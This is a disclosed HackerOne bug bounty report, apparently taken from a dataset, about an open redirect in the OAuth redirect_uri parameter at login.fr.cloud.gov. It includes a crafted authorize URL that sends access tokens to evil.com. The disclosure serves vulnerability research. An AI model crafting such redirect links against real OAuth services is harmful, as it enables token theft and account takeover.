---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '665651'
original_report_id: '665651'
title: Stealing Users OAuth Tokens through redirect_uri parameter
weakness: Open Redirect
team_handle: gsa_bbp
created_at: '2019-08-01T21:08:15.035Z'
disclosed_at: '2019-10-01T18:25:11.364Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 53
asset_identifier: login.fr.cloud.gov
asset_type: URL
max_severity: critical
tags:
- hackerone
- open-redirect
---

# Stealing Users OAuth Tokens through redirect_uri parameter

## Metadata

- HackerOne Report ID: 665651
- Weakness: Open Redirect
- Program: gsa_bbp
- Disclosed At: 2019-10-01T18:25:11.364Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I found that https://login.fr.cloud.gov/oauth/authorize has vulnerability by open redirect on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

Step : 
1, Clicked on link https://login.fr.cloud.gov/oauth/authorize?client_id=███&response_type=token&redirect_uri=https%3A%2F%2Fevil.com%2Fauth%2Fcallback&state=███

2, Choose any .gov account to login ( Screenshot ) then i believe you will got redirect to evil.com with oauth access token .

## Impact

Attacker can using this bug to stolen victim access token , that means he can takeover victim account .

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
